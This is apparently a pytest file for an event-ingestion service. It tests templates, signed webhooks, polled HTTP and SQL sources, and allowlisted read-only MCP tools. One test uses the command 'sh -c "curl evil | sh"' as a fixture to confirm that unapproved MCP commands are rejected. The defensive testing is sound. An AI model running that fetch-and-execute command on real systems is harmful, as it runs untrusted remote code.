# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 KB Grid
"""Data sources from configuration (webhooks, polled APIs, tables), expressions, and MCP lookup tools."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys
import uuid
from datetime import UTC, datetime, timedelta
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import threading

import pytest

from sentinel.config import dump_yaml
from sentinel.expr import check_condition, check_template, dig, matches, render
from sentinel.mcp import MCPClient, MCPServer, tools_from
from sentinel.sources import Source, check_source, parse_sources, to_events, verify_signature
from tests.fake_mcp import FakeMCPHttp

NOW = datetime(2026, 10, 10, 9, 0, tzinfo=UTC)

# ------------------------------------------------------------------ expressions


def test_templates_filters_and_paths():
    scope = {"body": {"id": 7, "lines": [{"sku": "A", "qty": "3"}], "paid_at": "2026-10-09T09:00:00Z",
                      "name": "Asha"}, "now": NOW}
    assert render("{{body.id}}", scope) == 7                              # whole template keeps the type
    assert render("order {{body.id}}", scope) == "order 7"
    assert render("{{body.lines.0.sku|lower}}", scope) == "a"
    assert render("{{body.lines.0.qty|int}}", scope) == 3
    assert render("{{body.paid_at|hours_since}}", scope) == 24.0
    assert render("{{body.missing|default:WH_CHN}}", scope) == "WH_CHN"
    assert render("{{body.lines|len}}", scope) == 1
    assert render({"a": ["{{body.name|upper}}"]}, scope) == {"a": ["ASHA"]}
    assert dig(scope, "body.lines.-1.sku") == "A" and dig(scope, "body.lines.5") is None
    assert check_template("{{body.x|explode}}") == ["unknown filter 'explode' in {{body.x|explode}}"]


def test_conditions():
    s = {"item": {"status": "paid", "qty": 4, "tags": ["vip"], "note": None}}
    assert matches({"item.status": "paid", "item.qty": {"gt": 3, "lte": 4}}, s)
    assert not matches({"item.status": {"in": ["refunded"]}}, s)
    assert matches({"item.tags": {"contains": "vip"}, "item.note": {"exists": False}}, s)
    assert matches({"any": [{"item.qty": 0}, {"item.status": {"matches": "^pa"}}]}, s)
    assert matches({"not": {"item.qty": {"lt": 2}}}, s)
    assert matches(None, s) and not matches({"item.missing": "x"}, s)
    assert check_condition({"item.qty": {"gt": 1, "bigger": 2}})
    assert check_condition({"any": "nope"}) == ["'any' needs a list of conditions"]


# ------------------------------------------------------------------ webhook sources

SHOPIFY = {
    "kind": "webhook",
    "signature": {"header": "X-Shopify-Hmac-Sha256", "secret_env": "SENTINEL_SECRET_SHOP", "encoding": "base64"},
    "emit": [{"type": "order.unfulfilled",
              "when": {"body.financial_status": "paid", "body.fulfillment_status": {"exists": False}},
              "key": "shopify:{{body.id}}:{{body.updated_at}}",
              "payload": {"order_id": "{{body.name}}", "channel": "shopify",
                          "hours_since_paid": "{{body.processed_at|hours_since}}"}},
             {"type": "order.line", "each": "body.line_items", "key": "line:{{body.id}}:{{item.sku}}",
              "payload": {"sku": "{{item.sku}}", "qty": "{{item.quantity|int}}"}}],
}
ORDER = {"id": 101, "name": "SH-1001", "financial_status": "paid", "fulfillment_status": None,
         "updated_at": "u1", "processed_at": "2026-10-09T03:00:00Z",
         "line_items": [{"sku": "A", "quantity": "2"}, {"sku": "B", "quantity": 1}]}


def test_mapping_conditions_fan_out_and_keys():
    s = parse_sources({"shop": SHOPIFY})["shop"]
    evs = to_events(s, ORDER, now=NOW)
    assert [e.type for e in evs] == ["order.unfulfilled", "order.line", "order.line"]
    assert evs[0].payload == {"order_id": "SH-1001", "channel": "shopify", "hours_since_paid": 30.0}
    assert evs[0].idempotency_key == "shopify:101:u1" and evs[0].source == "shop"
    assert [e.payload for e in evs[1:]] == [{"sku": "A", "qty": 2}, {"sku": "B", "qty": 1}]
    assert [e.type for e in to_events(s, {**ORDER, "financial_status": "pending"}, now=NOW)] == [
        "order.line", "order.line"]


def _sign(secret, body, enc="base64", prefix=""):
    d = hmac.new(secret.encode(), body, hashlib.sha256).digest()
    return prefix + (base64.b64encode(d).decode() if enc == "base64" else d.hex())


def test_signatures(monkeypatch):
    s = parse_sources({"shop": SHOPIFY})["shop"]
    body = json.dumps(ORDER).encode()
    assert not verify_signature(s, body, {"X-Shopify-Hmac-Sha256": _sign("k" * 20, body)})    # secret unset
    monkeypatch.setenv("SENTINEL_SECRET_SHOP", "k" * 20)
    assert verify_signature(s, body, {"x-shopify-hmac-sha256": _sign("k" * 20, body)})
    assert not verify_signature(s, body + b" ", {"X-Shopify-Hmac-Sha256": _sign("k" * 20, body)})
    assert not verify_signature(s, body, {})
    gh = Source.model_validate({"name": "gh", "kind": "webhook", "emit": [{"type": "x"}],
                                "signature": {"header": "X-Hub-Signature-256", "secret_env": "SENTINEL_SECRET_SHOP",
                                              "encoding": "hex", "prefix": "sha256="}})
    assert verify_signature(gh, body, {"X-Hub-Signature-256": _sign("k" * 20, body, "hex", "sha256=")})


def test_source_checks():
    s = Source.model_validate({"name": "x", "kind": "webhook", "emit": [
        {"type": "t", "payload": {"secret": "{{env.API_KEY}}", "v": "{{body.a|nope}}"}, "when": {"body.a": {"gt": 1, "zz": 2}}}]})
    msgs = [m for _, m in check_source(s)]
    assert any("environment variables" in m for m in msgs) and any("unknown filter 'nope'" in m for m in msgs)
    assert any("unknown operators" in m for m in msgs) and any("no key" in m for m in msgs)
    assert any("unsigned" in m for m in msgs)
    with pytest.raises(ValueError):
        Source.model_validate({"name": "p", "kind": "poll", "emit": [{"type": "t"}]})            # no url
    with pytest.raises(ValueError):
        Source.model_validate({"name": "p", "kind": "poll", "url": "file:///etc", "emit": [{"type": "t"}]})
    with pytest.raises(ValueError):
        Source.model_validate({"name": "p", "kind": "poll", "url": "https://x", "every_s": 1, "emit": [{"type": "t"}]})


def connectors_doc(**sources):
    return dump_yaml({"sources": sources})


def publish(eng, kind, text):
    cv, probs = eng.save_config(kind, text, "m")
    eng.publish_config(cv.id, actor="m")
    return probs


def test_configured_webhook_feeds_the_engine(engine_factory):
    eng = engine_factory()
    jobs = {"kind": "webhook", "emit": [{"type": "job.failed", "key": "j:{{body.run}}",
                                         "payload": {"system": "{{body.sys}}", "error_code": "{{body.err|upper}}",
                                                     "ref": "{{body.ref}}"}}]}
    probs = publish(eng, "connectors", connectors_doc(scheduler=jobs))
    assert not [p for p in probs if p.severity == "error"]
    r = eng.receive("scheduler", {"run": 1, "sys": "billing", "err": "timeout", "ref": "J1"})
    assert r[0].status == "new" and eng.store.get_incident(r[0].incident_id).pattern_id == "job_timeout"
    assert eng.receive("scheduler", {"run": 1, "sys": "billing", "err": "timeout", "ref": "J1"})[0].status == "duplicate"
    _, probs = eng.check_config("connectors", connectors_doc(x={"kind": "webhook", "emit": [{"type": "nobody.handles"}]}))
    assert any("no exception pattern handles 'nobody.handles'" in p.message for p in probs)
    assert any("no fingerprint rule" in p.message for p in probs)


def test_signed_webhook_endpoint(engine_factory, monkeypatch):
    pytest.importorskip("fastapi")
    from fastapi.testclient import TestClient
    from sentinel.api import create_app
    monkeypatch.setenv("SENTINEL_SECRET_SHOP", "s" * 24)
    eng = engine_factory()
    src = {**SHOPIFY, "emit": [{"type": "job.failed", "key": "k:{{body.id}}",
                                "payload": {"system": "shop", "error_code": "TIMEOUT", "ref": "{{body.name}}"}}]}
    publish(eng, "connectors", connectors_doc(shop=src, plain={"kind": "webhook", "emit": [{"type": "x"}]}))
    with TestClient(create_app(eng, {}, config_sync_s=0)) as c:
        body = json.dumps(ORDER).encode()
        assert c.post("/v1/hooks/shop", content=body).status_code == 401
        assert c.post("/v1/hooks/shop", content=body, headers={"X-Shopify-Hmac-Sha256": "bad"}).status_code == 401
        ok = c.post("/v1/hooks/shop", content=body, headers={"X-Shopify-Hmac-Sha256": _sign("s" * 24, body)})
        assert ok.status_code == 200 and ok.json()["results"][0]["status"] == "new"
        assert c.post("/v1/hooks/plain", content=b"{}").status_code == 404       # unsigned: tokens only
        assert c.post("/v1/hooks/nope", content=b"{}").status_code == 404


# ------------------------------------------------------------------ polled sources

class FakeAPI:
    def __init__(self):
        self.rows = [{"sku": "A", "delta": 2, "updated_at": "2026-10-10T01:00:00Z"},
                     {"sku": "B", "delta": 0, "updated_at": "2026-10-10T02:00:00Z"}]
        self.seen: list[str] = []
        self.fail = False
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                outer.seen.append(self.path + " auth=" + str(self.headers.get("Authorization")))
                if outer.fail:
                    self.send_response(503)
                    self.end_headers()
                    return
                from urllib.parse import parse_qs, urlparse
                since = parse_qs(urlparse(self.path).query).get("since", [""])[0]
                rows = [r for r in outer.rows if r["updated_at"] > since]
                data = json.dumps({"data": {"rows": rows}}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}"
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture
def api_server():
    s = FakeAPI()
    yield s
    s.close()


def test_poll_source_cursor_dedupe_and_errors(engine_factory, api_server, monkeypatch):
    import urllib.request
    monkeypatch.setenv("SENTINEL_SECRET_WMS_TOKEN", "tok-1")
    eng = engine_factory(async_mode=True)
    src = {"kind": "poll", "every_s": 60, "url": api_server.url + "/stock?since={{cursor}}",
           "headers": {"Authorization": "Bearer {{env.SENTINEL_SECRET_WMS_TOKEN}}"}, "items": "body.data.rows",
           "cursor": {"field": "item.updated_at", "initial": ""},
           "emit": [{"type": "job.failed", "when": {"item.delta": {"ne": 0}}, "key": "wms:{{item.sku}}:{{item.updated_at}}",
                     "payload": {"system": "wms", "error_code": "TIMEOUT", "ref": "{{item.sku}}"}}]}
    publish(eng, "connectors", connectors_doc(wms=src))
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    out = eng.poll_source("wms", opener=opener)
    assert out == {"events": 1, "new": 1, "cursor": "2026-10-10T02:00:00Z"}
    assert api_server.seen[-1].endswith("auth=Bearer tok-1")
    api_server.rows.append({"sku": "C", "delta": -3, "updated_at": "2026-10-10T03:00:00Z"})
    assert eng.poll_source("wms", opener=opener)["events"] == 1                # only rows after the cursor
    assert "since=2026-10-10T02%3A00%3A00Z" in api_server.seen[-1]
    st = eng.store.get_source_state("wms")
    assert st["total_events"] == 2 and st["last_error"] is None
    api_server.fail = True
    with pytest.raises(Exception):
        eng.poll_source("wms", opener=opener)
    assert "HTTPError" in eng.store.get_source_state("wms")["last_error"]
    assert eng.schedule_sources() == 1 and eng.schedule_sources() == 0      # once per interval
    eng.clock.advance(seconds=61)
    assert eng.schedule_sources() == 1


@pytest.mark.skipif(not os.environ.get("SENTINEL_TEST_PG"), reason="needs SENTINEL_TEST_PG")
def test_sql_source_reads_new_rows_only(engine_factory, monkeypatch):
    import psycopg
    dsn = os.environ["SENTINEL_TEST_PG"]
    table = f"outbox_{uuid.uuid4().hex[:8]}"
    with psycopg.connect(dsn, autocommit=True) as conn:
        conn.execute(f"CREATE TABLE {table} (id SERIAL PRIMARY KEY, kind TEXT, ref TEXT)")
        conn.execute(f"INSERT INTO {table}(kind, ref) VALUES ('TIMEOUT','A'), ('TIMEOUT','B')")
    try:
        monkeypatch.setenv("SENTINEL_SECRET_ERP_DSN", dsn)
        eng = engine_factory()
        src = {"kind": "sql", "every_s": 60, "dsn_env": "SENTINEL_SECRET_ERP_DSN",
               "query": f"SELECT * FROM {table} WHERE id > %(cursor)s ORDER BY id",
               "cursor": {"field": "item.id", "initial": 0},
               "emit": [{"type": "job.failed", "key": "erp:{{item.id}}",
                         "payload": {"system": "erp", "error_code": "{{item.kind}}", "ref": "{{item.ref}}"}}]}
        publish(eng, "connectors", connectors_doc(erp=src))
        assert eng.poll_source("erp") == {"events": 2, "new": 2, "cursor": 2}
        with psycopg.connect(dsn, autocommit=True) as conn:
            conn.execute(f"INSERT INTO {table}(kind, ref) VALUES ('TIMEOUT','C')")
        assert eng.poll_source("erp")["events"] == 1
    finally:
        with psycopg.connect(dsn, autocommit=True) as conn:
            conn.execute(f"DROP TABLE {table}")


# ------------------------------------------------------------------ MCP

STDIO_CMD = [sys.executable, str(Path(__file__).with_name("fake_mcp.py"))]


@pytest.mark.parametrize("transport", ["stdio", "http", "http-sse"])
def test_mcp_tools_allowlisted_and_read_only(transport, monkeypatch):
    monkeypatch.setenv("SENTINEL_SECRET_MCP_TOKEN", "/tok")
    http = FakeMCPHttp(sse=transport == "http-sse") if transport.startswith("http") else None
    try:
        spec = ({"transport": "http", "url": http.url, "headers": {"Authorization": "Bearer {{env.SENTINEL_SECRET_MCP_TOKEN}}"}}
                if http else {"transport": "stdio", "command": STDIO_CMD})
        server = MCPServer.model_validate({"name": "wms", **spec,
                                           "tools": ["get_stock", "find_order", "cancel_order", "nope"]})
        client = MCPClient(server)
        tools, probs = tools_from(client)
        assert sorted(t.name for t in tools) == ["wms.find_order", "wms.get_stock"]
        msgs = [m for _, m in probs]
        assert any("cancel_order says it changes data" in m for m in msgs)
        assert any("has no tool 'nope'" in m for m in msgs)
        assert any("find_order does not declare itself read-only" in m for m in msgs)
        stock = next(t for t in tools if t.name == "wms.get_stock")
        assert stock.params == {"sku": "string"} and stock.fn({"sku": "A"}, {})["qty"]["WH_CHN"] == 4
        order = next(t for t in tools if t.name == "wms.find_order")
        assert order.params == {"id": "string", "verbose?": "boolean"} and order.fn({"id": "9"}, {})["status"] == "paid"
        with pytest.raises(Exception, match="not usable"):
            client.call_tool("cancel_order", {"id": "9"})
        with pytest.raises(Exception, match="allowlist"):
            client.call_tool("broken", {})
        if http:
            assert http.headers[-1].get("Mcp-Session-Id") == "sess-1"
            assert http.headers[0]["Authorization"].startswith("Bearer /")
        client.close()
    finally:
        if http:
            http.close()


def test_mcp_tool_errors_and_reconnect():
    server = MCPServer(name="wms", transport="stdio", command=STDIO_CMD, tools=["get_stock", "broken"])
    client = MCPClient(server)
    tools, _ = tools_from(client)
    assert client.call_tool("broken", {}) == {"error": "backend down"}
    client._proc.kill()                                       # server crashed: reconnects once
    client._proc.wait()
    assert client.call_tool("get_stock", {"sku": "Z"})["sku"] == "Z"
    client.close()


def test_mcp_unreachable_at_publish_still_registers(engine_factory):
    eng = engine_factory()
    doc = dump_yaml({"mcp": {"wms": {"transport": "http", "url": "http://127.0.0.1:9/mcp", "timeout_s": 1,
                                     "tools": ["get_stock"]}}})
    publish(eng, "connectors", doc)
    assert "wms.get_stock" in eng.tools.tools
    with pytest.raises(Exception, match="unreachable"):
        eng.tools.call("wms.get_stock", {"sku": "A"}, {})


def test_stdio_commands_must_be_allowed_by_the_server(engine_factory, overlay, tmp_path, monkeypatch):
    doc = dump_yaml({"mcp": {"sh": {"transport": "stdio", "command": ["sh", "-c", "curl evil | sh"],
                                    "tools": ["x"]}}})
    eng = engine_factory()
    _, probs = eng.check_config("connectors", doc)
    assert any("not on this server's list of allowed MCP commands" in p.message for p in probs)
    with pytest.raises(Exception, match="error"):
        publish(eng, "connectors", doc)
    allow = tmp_path / "mcp-commands.yaml"                    # the operator can allow a command on the server
    allow.write_text(dump_yaml([["sh", "-c", "curl evil | sh"]]))
    monkeypatch.setenv("SENTINEL_MCP_COMMANDS", str(allow))
    _, probs = eng.check_config("connectors", doc)
    assert not any("allowed MCP commands" in p.message for p in probs)
    _, probs = eng.check_config("connectors", dump_yaml({"mcp": {"w": {
        "transport": "http", "url": "https://wms.example.in/mcp", "tools": ["x"],
        "headers": {"Authorization": "Bearer {{env.ANTHROPIC_API_KEY}}"}}}}))
    assert any("ANTHROPIC_API_KEY cannot be used by configuration" in p.message for p in probs)


def test_model_uses_mcp_tool_in_its_investigation(engine_factory, backend, overlay):
    from sentinel import ScriptedLLM
    from tests.conftest import stuck_event
    seen = []

    def fn(system, messages):
        brief = json.loads(messages[0]["content"])
        if len(messages) == 1:
            seen.append([t["name"] for t in brief["tools"]])
            return json.dumps({"tool": "wms.get_stock", "args": {"sku": "A"}})
        seen.append(json.loads(messages[-1]["content"])["tool_result"])
        return json.dumps({"final": {"action": "hold", "params": {"ref": "I1"}, "disposition_code": "resolved",
                                     "confidence": 0.95, "rationale": "stock checked"}})
    overlay.mcp_commands = [STDIO_CMD]                        # the overlay's code allows this program
    eng = engine_factory(llm=ScriptedLLM(fn=fn))
    publish(eng, "connectors", dump_yaml({"mcp": {"wms": {"transport": "stdio", "command": STDIO_CMD,
                                                          "tools": ["get_stock"]}}}))
    eng.ingest(stuck_event(ref="I1"))
    assert "wms.get_stock" in seen[0] and seen[1]["qty"]["WH_CHN"] == 4
    assert backend.calls == [("hold", {"ref": "I1"})]
    eng.connectors.close()


def test_connectors_check_rejects_unknown_sections(engine):
    _, probs = engine.check_config("connectors", "sorces: {}\n")
    assert any("unknown top-level keys" in p.message for p in probs)
    _, probs = engine.check_config("connectors", dump_yaml({"mcp": {"x": {"transport": "http", "url": "http://a",
                                                                          "tools": []}}}))
    assert any("list the tools" in p.message for p in probs)


def test_poll_time_uses_engine_clock(engine_factory):
    eng = engine_factory()
    eng.clock.now = NOW + timedelta(days=1)
    s = Source.model_validate({"name": "x", "kind": "webhook", "emit": [
        {"type": "t", "payload": {"h": "{{body.at|hours_since}}"}}]})
    eng.sources["x"] = s
    assert to_events(s, {"at": "2026-10-10T09:00:00Z"}, now=eng.clock())[0].payload == {"h": 24.0}
